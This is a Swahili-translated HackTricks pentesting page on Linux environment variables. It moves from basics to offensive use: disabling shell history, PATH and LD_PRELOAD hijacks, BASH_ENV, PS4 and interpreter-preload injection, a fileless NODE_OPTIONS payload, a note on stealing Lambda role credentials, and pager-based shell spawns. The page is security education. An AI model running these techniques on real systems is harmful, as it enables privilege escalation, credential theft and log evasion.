# Vigezo vya Mazingira vya Linux

{{#include ../../banners/hacktricks-training.md}}

## Vigezo vya kimataifa

Vigezo vya kimataifa **vitarithiwa** na **process za watoto**.

Unaweza kuunda kigezo cha kimataifa kwa ajili ya session yako ya sasa kwa kufanya:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Kigezo hiki kitaweza kufikiwa na sessions zako za sasa na michakato yake ya watoto.

Unaweza **kuondoa** kigezo kwa kufanya:
```bash
unset MYGLOBAL
```
## Vigezo vya ndani

**Vigezo vya ndani** vinaweza tu **kufikiwa** na **shell/script ya sasa**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Orodhesha vigezo vya sasa
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Yaliyomo kwenye `/proc/*/environ` yametenganishwa kwa **NUL**, hivyo variants hizi kwa kawaida ni rahisi kusoma:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Ikiwa unatafuta **credentials** au **interesting service configuration** ndani ya mazingira yaliyorithiwa, pia angalia [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Vigezo vya kawaida

Kutoka: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – display inayotumiwa na **X**. Kigezo hiki kwa kawaida huwekwa kuwa **:0.0**, kumaanisha display ya kwanza kwenye kompyuta ya sasa.
- **EDITOR** – text editor anayependelewa na mtumiaji.
- **HISTFILESIZE** – idadi ya juu ya mistari iliyo kwenye history file.
- **HISTSIZE** – Idadi ya mistari inayoongezwa kwenye history file mtumiaji anapomaliza session yake.
- **HOME** – directory yako ya nyumbani.
- **HOSTNAME** – hostname ya kompyuta.
- **LANG** – lugha yako ya sasa.
- **MAIL** – eneo la mail spool ya mtumiaji. Kwa kawaida ni **/var/spool/mail/USER**.
- **MANPATH** – orodha ya directories za kutafutwa kwa manual pages.
- **OSTYPE** – aina ya operating system.
- **PS1** – prompt chaguomsingi katika bash.
- **PATH** – huhifadhi path ya directories zote zilizo na binary files unazotaka kutekeleza kwa kutaja tu jina la file, badala ya kutumia relative au absolute path.
- **PWD** – working directory ya sasa.
- **SHELL** – path ya command shell ya sasa (kwa mfano, **/bin/bash**).
- **TERM** – aina ya terminal ya sasa (kwa mfano, **xterm**).
- **TZ** – time zone yako.
- **USER** – username yako ya sasa.

## Vigezo vya kuvutia kwa hacking

Si kila kigezo kina manufaa sawa. Kwa mtazamo wa offensive, panga kwa kipaumbele vigezo vinavyobadilisha **search paths**, **startup files**, **dynamic linker behavior**, au **audit/logging**.

### **HISTFILESIZE**

Badilisha **value ya kigezo hiki iwe 0**, ili unapomaliza **session yako** **history file** (\~/.bash_history) **ipunguzwe iwe na mistari 0**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Badilisha **thamani ya variable hii iwe 0**, ili amri **zisihifadhiwe kwenye history iliyo kwenye memory** na zisiandikwe tena kwenye **history file** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Ikiwa **thamani ya variable hii imewekwa kuwa `ignorespace` au `ignoreboth`**, command yoyote iliyo na space ya ziada mwanzoni haitahifadhiwa kwenye history.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Elekeza **history file** kwenye **`/dev/null`** au iondoe kabisa. Hii kwa kawaida inaaminika zaidi kuliko kubadilisha tu ukubwa wa history.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Michakato itatumia **proxy** iliyotangazwa hapa kuunganishwa kwenye intaneti kupitia **http au https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: proxy chaguo-msingi kwa tools/protocols zinazoiunga mkono.
- `no_proxy`: orodha ya kupita proxy (hosts/domains/CIDRs) zinazopaswa kuunganishwa moja kwa moja.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Aina za herufi ndogo na kubwa zinaweza kutumika kulingana na tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Michakato itaamini certificates zilizoonyeshwa katika **hivi vigeu vya env**. Hii ni muhimu ili kufanya tools kama **`curl`**, **`git`**, HTTP clients za Python, au package managers ziweke imani kwa CA inayodhibitiwa na mshambuliaji (kwa mfano, kufanya interception proxy ionekane halali).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ikiwa privileged wrapper/script inaendesha commands **bila absolute paths**, directory ya kwanza inayodhibitiwa na attacker ndani ya `PATH` ndiyo itakayotumika. Hii ndiyo primitive inayotumika nyuma ya **PATH hijacks** nyingi katika `sudo`, cron jobs, shell wrappers, na custom SUID helpers. Tafuta `env_keep+=PATH`, `secure_path` dhaifu, au wrappers zinazoita `tar`, `service`, `cp`, `python`, n.k. kwa majina.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Kwa minyororo kamili ya privilege-escalation inayotumia vibaya `PATH`, angalia [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` si rejeleo la directory pekee: tools nyingi hupakia kiotomatiki **dotfiles**, **plugins**, na **per-user configuration** kutoka `$HOME` au `$XDG_CONFIG_HOME`. Ikiwa workflow yenye privileges itahifadhi thamani hizi, **config injection** inaweza kuwa rahisi kuliko binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Malengo ya kuvutia yanajumuisha `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, na mafaili mahususi ya zana kama vile `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Vigezo hivi huathiri **dynamic linker**:

- `LD_PRELOAD`: hulazimisha shared objects za ziada kupakiwa kwanza.
- `LD_LIBRARY_PATH`: huongeza mwanzoni directories za kutafutia libraries.
- `LD_AUDIT`: hupakia auditor libraries zinazoangalia upakiaji wa libraries na utatuzi wa symbols.

Ni muhimu sana kwa **hooking**, **instrumentation**, na **privilege escalation** ikiwa command yenye privileges itazihifadhi. Katika hali ya **secure-execution** (`AT_SECURE`, kwa mfano setuid/setgid/capabilities), loader huondoa au kuzuia vigezo hivi vingi. Hata hivyo, parser bugs katika hatua hiyo ya mwanzo ya loader bado zina athari kubwa kwa sababu huendeshwa **kabla** ya target program.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` hubadilisha tabia ya mapema ya glibc (kwa mfano, allocator tunables) na ni muhimu sana katika exploit labs. Pia ni muhimu kwa mtazamo wa usalama kwa sababu **dynamic loader hui-parse mapema sana**. Bug ya **Looney Tunables** ya mwaka 2023 ilikuwa ukumbusho mzuri kwamba environment variable moja inayoparsiwa na loader inaweza kuwa **local privilege-escalation primitive** dhidi ya programu za SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Ikiwa **Bash** imeanzishwa **non-interactively**, hukagua `BASH_ENV` na ku-source faili hilo kabla ya kuendesha script lengwa. Bash inapoitwa kama `sh`, au katika hali ya interactive ya mtindo wa POSIX, `ENV` pia inaweza kuchunguzwa. Hii ni njia ya kawaida ya kubadilisha shell wrapper kuwa code execution ikiwa mazingira yanadhibitiwa na attacker.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash hupuuza faili hizi za kuanzisha wakati **ID halisi/effektivu zinatofautiana**; `-p` huhifadhi ID effektivu lakini haiwashi faili hizo za kuanzisha, kwa hiyo tabia halisi hutegemea jinsi wrapper inavyoanzisha shell. Kuwa mwangalifu na wrappers zenye mamlaka zinazotumia `setuid()`/`setgid()` **kabla** ya kuanzisha Bash: ID zinapolingana tena, Bash inaweza kuamini `BASH_ENV`, `ENV`, na hali nyingine zinazohusiana na shell ambazo vinginevyo zingepuuzwa.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash inapoendeshwa ikiwa **xtrace** imewashwa, hupanua `PS4` na kuichapisha kabla ya kila command inayofuatiliwa. `PS4` hupanuliwa kama prompt, kwa hiyo **command substitution** iliyo ndani yake hutekelezwa. Muhimu zaidi, xtrace yenyewe inaweza kuwashwa moja kwa moja kutoka kwenye environment kwa ku-export `SHELLOPTS=xtrace` — hakuna haja ya `-x` kwenye command line — kwa hiyo script yoyote ya Bash ambayo mwathiriwa anaendesha huwa code execution.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` haifanyi chochote hadi xtrace iwe active (`SHELLOPTS=xtrace`, `set -x` au `bash -x`), na Bash huondoa `SHELLOPTS` katika mazingira ya privileged/setuid kama ilivyo kwa `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Vigezo hivi hubadilisha jinsi Python inavyoanza:

- `PYTHONPATH`: huongeza mwanzoni paths za kutafutia imports.
- `PYTHONHOME`: huhamisha mti wa standard library.
- `PYTHONSTARTUP`: huendesha file kabla ya interactive prompt.
- `PYTHONINSPECT=1`: huingia katika interactive mode baada ya script kumaliza.
- `PYTHONBREAKPOINT`: `package.module.callable` inayoitwa (na module yake ku-importiwa) code inapofikia `breakpoint()`.<sup>[[8]](#references)</sup>

Ni muhimu dhidi ya maintenance scripts, debuggers, shells na wrappers zinazoita Python zikiwa na environment inayoweza kudhibitiwa. `python -E` na `python -I` hupuuza vigezo vyote vya `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Mfano halisi wa hivi karibuni ulikuwa **needrestart** LPE ya 2024 kwenye mifumo ya Ubuntu/Debian: scanner inayomilikiwa na root ilinakili `PYTHONPATH` ya process isiyo na privileges kutoka `/proc/<PID>/environ` na kisha ikaendesha Python. Exploit iliyochapishwa iliweka `importlib/__init__.so` kwenye path inayodhibitiwa na attacker, hivyo Python ikaendesha code ya attacker wakati wa initialization yake yenyewe, kabla hata script iliyowekwa moja kwa moja kwenye helper haijawa muhimu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ina startup variables zenye manufaa sawa:

- `PERL5LIB`: weka library directories mwanzoni.
- `PERL5OPT`: inject switches kana kwamba zilikuwa kwenye kila command line ya `perl`.

Hii inaweza kulazimisha **automatic module loading** au kubadilisha tabia ya interpreter kabla script inayolengwa haijafanya chochote cha kuvutia. Perl hupuuza variables hizi katika contexts za **taint / setuid / setgid**, lakini bado zina umuhimu mkubwa kwa wrappers zinazoendeshwa na root kwa kawaida, CI jobs, installers, na custom sudoers rules.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` huongeza **Node.js CLI flags** mwanzoni mwa kila `node` process inayorithi environment. Hii huifanya iwe muhimu dhidi ya wrappers, CI jobs, Electron helpers, na sudo rules ambazo hatimaye huendesha Node. Flags zinazovutia zaidi kwa matumizi ya offensive kwa kawaida ni:

- `--require <file>`: pakia mapema CommonJS file kabla ya target script.
- `--import <module>`: pakia mapema ES module kabla ya target script.

Node hukataa baadhi ya flags hatari katika `NODE_OPTIONS`, lakini `--require` na `--import` zinaruhusiwa wazi na huchakatwa **kabla** ya command-line arguments za kawaida.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Fileless preload kwa kutumia URL ya `data:`

Unapoweza kuweka `NODE_OPTIONS` lakini **huwezi kuandika file** kwenye target (filesystem ya read-only, API yenye vizuizi, serverless runtime, n.k.), `--import` inakubali URL ya `data:text/javascript,`, hivyo payload nzima husafirishwa ndani ya environment variable yenyewe. JavaScript lazima iwe **imewekwa URL-encoded kikamilifu** — Node huchanganua thamani hiyo kama URL, kwa hivyo space yoyote mbichi (au char nyingine yoyote ambayo haija-encoded) hukata payload na kusababisha `SyntaxError`. Hii hufanya kazi kwenye Node 20.6+ ambapo `--import` iko kwenye allowlist ya `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Hii ni njia ya kawaida ya kubadilisha udhibiti wa `NODE_OPTIONS` kuwa RCE kwenye **managed cloud runtimes** ambazo functions zake hutumia Node. Kwa mfano, attacker anayeweza tu kubadilisha configuration ya Lambda (`lambda:UpdateFunctionConfiguration`, bila `iam:PassRole` wala code update) anaweza kuingiza `NODE_OPTIONS=--import data:text/javascript,<payload>` ili kuendesha code ndani ya function na kuiba credentials za execution-role yake. Module iliyoingizwa huendeshwa **kabla** ya handler, ambayo bado huendelea kutekelezwa kawaida baadaye.

Kwa remote gadget chains zinazoweka `NODE_OPTIONS` kwa njia isiyo ya moja kwa moja (kwa mfano, prototype-pollution hadi RCE), angalia [ukurasa huu mwingine](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby hutoa aina hiyo hiyo ya startup abuse:

- `RUBYLIB`: huongeza directories mwanzoni mwa load path ya Ruby.
- `RUBYOPT`: huingiza command-line options kama `-r` kwenye kila invocation ya `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Vulnerabilities za **needrestart** za mwaka 2024 zilionyesha kuwa hii si mbinu ya maabara pekee: helper huyo huyo mwenye root privileges aliyekuwa katika hatari ya kutumiwa vibaya kupitia `PYTHONPATH` angeweza pia kulazimishwa kuendesha Ruby ikiwa na `RUBYLIB` inayodhibitiwa na attacker, na kupakia `enc/encdb.so` kutoka kwenye directory ya attacker.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim hutekeleza Ex commands zilizo ndani ya `VIMINIT` (au `EXINIT` kama fallback) wakati wa startup ya kawaida. Ex commands zinajumuisha `:!cmd` na `:call system(...)`, hivyo kudhibiti variable hii huwezesha code execution kila victim anapofungua Vim (`sudo vim` yenye root, `crontab -e`, `visudo`, `git`/`less` inayozindua `$EDITOR`, n.k.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Hali ya batch (`vim -es`/`-Es`) huruka variables hizi, lakini uanzishaji wa kawaida wa interactive huzitekeleza.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) huendesha kwenye Linux/macOS (na Windows) na ni **programu ya .NET**, hivyo variables kadhaa za mazingira hugeuza invocation yoyote ya `pwsh` yenye mazingira yaliyorithiwa kuwa code execution — muhimu dhidi ya kazi za cron/systemd, CI runners na wrappers zenye privileges zinazoendesha `pwsh`.

- `PSModulePath`: PowerShell hutafuta kwa kurudia kila directory iliyo kwenye orodha hii kwa modules za `.psd1`/`.psm1` na **hupakia moja kiotomatiki** mara ya kwanza command inayotolewa nayo inapotajwa. Ongeza directory mwanzoni na code ya kiwango cha juu ya module yako huendeshwa wakati wa import; kwa sababu resolution ni *Alias → Function → Cmdlet*, function iliyotolewa inaweza hata kuficha built-in cmdlet ambayo victim anaita.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: huhamisha `powershell/Microsoft.PowerShell_profile.ps1`, ambayo hutekelezwa wakati wa startup (isipokuwa `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: managed assembly ambayo `StartupHook.Initialize()` huendeshwa kabla ya `Main` (hushirikiwa na kila .NET app).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API hupakia attacker library kwenye process wakati wa startup (path vars hushinda registry; `DOTNET_*` ndiyo alias mpya zaidi). Kwenye Windows PowerShell 5.1 (.NET Framework), tumia `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Kwenye Windows, `PSExecutionPolicyPreference=Bypass` pia huondoa kizuizi cha "unsigned scripts blocked", hivyo profile/module iliyopandikizwa huendeshwa. Tazama ukurasa maalum kwa PoCs kamili:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Baadhi ya tools hazisomi tu path kutoka kwenye environment; hupitisha thamani hiyo kwa **shell**, **editor**, au **input preprocessor**. Hii hufanya variables zifuatazo zivutie hasa wakati wrapper yenye privileged privileges inapoendesha `git`, `man`, `less`, au text viewers zinazofanana:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: huchagua pager command.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: huchagua editor command, mara nyingi pamoja na arguments.
- `LESSOPEN`, `LESSCLOSE`: hufafanua pre/post-processors zinazoendeshwa wakati `less` inapofungua file.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git pia inasaidia **env-only config injection** bila kugusa diski kupitia `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, na `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Kwa mtazamo wa post-exploitation, kumbuka pia kwamba inherited environments mara nyingi huwa na **credentials**, **proxy settings**, **service tokens**, au **cloud keys**. Angalia [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) kwa utafutaji wa `/proc/<PID>/environ` na `systemd` `Environment=`.

### PS1

Badilisha jinsi prompt yako inavyoonekana.

[**Huu ni mfano**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Huu ni mfano](<../images/image (897).png>)

Mtumiaji wa kawaida:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa kwa nyuma](<../images/image (740).png>)

Kazi moja, mbili na tatu zinazoendeshwa kwa nyuma:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa kwa nyuma](<../images/image (145).png>)

Kazi moja ya nyuma, moja iliyosimamishwa, na amri ya mwisho haikukamilika kwa usahihi:

![PERL5OPT & PERL5LIB - PS1: Kazi moja ya nyuma, moja iliyosimamishwa, na amri ya mwisho haikukamilika kwa usahihi](<../images/image (715).png>)

## References

- [1] [Mwongozo wa GNU Bash - Faili za Kuanzisha Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs katika needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Nyaraka za CLI za Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Environment variables za kawaida - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation katika ld.so ya glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Mwongozo wa GNU Bash - Bash Variables (`PS4`) na The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() iliyojengewa ndani na PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Nyaraka za Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath na PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Mipangilio ya debugging na profiling ya .NET (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
